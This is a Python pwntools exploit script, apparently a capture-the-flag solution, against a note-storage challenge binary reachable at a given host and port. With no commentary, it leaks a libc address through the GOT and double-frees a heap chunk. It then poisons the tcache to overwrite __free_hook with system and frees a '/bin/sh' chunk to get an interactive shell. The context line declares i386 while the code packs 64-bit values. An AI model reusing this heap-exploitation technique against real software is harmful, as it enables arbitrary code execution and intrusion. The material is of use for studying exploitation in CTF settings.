from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "13.231.207.73"
PORT = 9007 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
got_puts = elf.got["puts"]
got_printf = elf.got["printf"]

libc = ELF('./libc.so')
off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]
off_free_hook = libc.symbols["__free_hook"]
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

l = 1
d = 2
s = 3

def add(t, data):
	conn.sendlineafter("> ", "1")
	conn.sendlineafter(": ", str(t))
	conn.sendlineafter(": ", data)

def get(index, t):
	conn.sendlineafter("> ", "2")
	conn.sendlineafter(": ", str(index))
	conn.sendlineafter(": ", str(t))
	conn.recvuntil(": ")

def edit(index, t, data):
	conn.sendlineafter("> ", "3")
	conn.sendlineafter(": ", str(index))
	conn.sendlineafter(": ", str(t))
	conn.sendlineafter(": ", data)

def delete(index):
	conn.sendlineafter("> ", "4")
	conn.sendlineafter(": ", str(index))
	
def exploit():
	add(l, str(got_puts)) #0
	get(0, s)
	libc_puts = u64(conn.recv(6) + "\x00\x00")
	libc_base = libc_puts - off_puts
	print hex(libc_base)
	
	libc_system = libc_base + off_system
	libc_hook = libc_base + off_free_hook

	add(s, "pokemon")#1
	get(1, l)
	chk1 = int(conn.recvline())
	print hex(chk1)
	add(l, str(chk1)) #2,1
	delete(1)
	delete(1)
	add(s, p64(libc_hook))#1
	add(s, "/bin/sh")#2
	add(s, p64(libc_system))#3
	delete(2)	
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
